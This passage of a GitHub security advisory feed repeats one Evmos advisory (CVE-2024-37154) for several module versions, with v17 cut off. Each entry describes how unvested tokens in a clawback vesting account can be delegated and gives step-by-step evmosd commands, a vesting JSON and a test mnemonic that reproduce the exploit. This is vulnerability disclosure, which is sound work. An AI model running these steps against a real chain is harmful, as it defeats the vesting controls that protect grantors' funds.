<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><a href="https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href="https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv">second advisory on the Cosmos SDK fork</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>
<ol>
<li>Download <code>vesting_setup.json</code> with the following contents:</li>
</ol>
<pre><code>{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10 
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}
</code></pre>
<ol start="2">
<li>Run the following CLI commands to reproduce the issue locally:</li>
</ol>
<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37154">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>
<li><a href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T19:10:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v10] Evmos allows unvested token delegations]]></title>
        <id>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</id>
        <link href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw"/>
        <updated>2024-06-06T21:32:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><a href="https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href="https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv">second advisory on the Cosmos SDK fork</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>
<ol>
<li>Download <code>vesting_setup.json</code> with the following contents:</li>
</ol>
<pre><code>{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10 
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}
</code></pre>
<ol start="2">
<li>Run the following CLI commands to reproduce the issue locally:</li>
</ol>
<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37154">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>
<li><a href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T19:10:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v11] Evmos allows unvested token delegations]]></title>
        <id>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</id>
        <link href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw"/>
        <updated>2024-06-06T21:32:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><a href="https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href="https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv">second advisory on the Cosmos SDK fork</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>
<ol>
<li>Download <code>vesting_setup.json</code> with the following contents:</li>
</ol>
<pre><code>{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10 
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}
</code></pre>
<ol start="2">
<li>Run the following CLI commands to reproduce the issue locally:</li>
</ol>
<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37154">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>
<li><a href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T19:10:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v12] Evmos allows unvested token delegations]]></title>
        <id>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</id>
        <link href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw"/>
        <updated>2024-06-06T21:32:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><a href="https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href="https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv">second advisory on the Cosmos SDK fork</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>
<ol>
<li>Download <code>vesting_setup.json</code> with the following contents:</li>
</ol>
<pre><code>{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10 
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}
</code></pre>
<ol start="2">
<li>Run the following CLI commands to reproduce the issue locally:</li>
</ol>
<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37154">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>
<li><a href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T19:10:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v13] Evmos allows unvested token delegations]]></title>
        <id>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</id>
        <link href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw"/>
        <updated>2024-06-06T21:32:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><a href="https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href="https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv">second advisory on the Cosmos SDK fork</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>
<ol>
<li>Download <code>vesting_setup.json</code> with the following contents:</li>
</ol>
<pre><code>{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10 
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}
</code></pre>
<ol start="2">
<li>Run the following CLI commands to reproduce the issue locally:</li>
</ol>
<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37154">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>
<li><a href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T19:10:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v14] Evmos allows unvested token delegations]]></title>
        <id>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</id>
        <link href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw"/>
        <updated>2024-06-06T21:32:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><a href="https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href="https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv">second advisory on the Cosmos SDK fork</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>
<ol>
<li>Download <code>vesting_setup.json</code> with the following contents:</li>
</ol>
<pre><code>{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10 
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}
</code></pre>
<ol start="2">
<li>Run the following CLI commands to reproduce the issue locally:</li>
</ol>
<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37154">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>
<li><a href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T19:10:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v15] Evmos allows unvested token delegations]]></title>
        <id>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</id>
        <link href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw"/>
        <updated>2024-06-06T21:32:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><a href="https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href="https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv">second advisory on the Cosmos SDK fork</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>
<ol>
<li>Download <code>vesting_setup.json</code> with the following contents:</li>
</ol>
<pre><code>{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10 
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}
</code></pre>
<ol start="2">
<li>Run the following CLI commands to reproduce the issue locally:</li>
</ol>
<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37154">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>
<li><a href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T19:10:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v16] Evmos allows unvested token delegations]]></title>
        <id>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</id>
        <link href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw"/>
        <updated>2024-06-06T21:32:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><a href="https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href="https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv">second advisory on the Cosmos SDK fork</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>
<ol>
<li>Download <code>vesting_setup.json</code> with the following contents:</li>
</ol>
<pre><code>{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10 
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}
</code></pre>
<ol start="2">
<li>Run the following CLI commands to reproduce the issue locally:</li>
</ol>
<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37154">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>
<li><a href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T19:10:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v17] Evmos allows unvested token delegations]]></title>
        <id>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</id>
        <link href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw"/>
        <updated>2024-06-06T21:32:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
